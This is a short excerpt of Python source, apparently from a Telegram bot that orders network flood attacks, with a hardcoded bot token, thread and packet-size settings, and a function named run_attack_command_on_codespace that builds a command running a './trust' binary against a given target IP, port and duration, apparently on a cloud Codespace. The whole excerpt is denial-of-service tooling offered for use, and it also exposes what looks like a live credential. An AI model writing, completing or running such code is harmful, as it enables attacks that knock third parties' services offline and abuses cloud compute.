...
BOT_TOKEN = "7740649057:AAEt-rrqk86RO07Vl2zpbLvM5s3CYwYTH2M"
thread_count = 800
packet_size = 8
...
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id, user_id):
    try:
        ...
        command = f"./trust {target_ip} {target_port} {duration} {packet_size} {thread_count}"
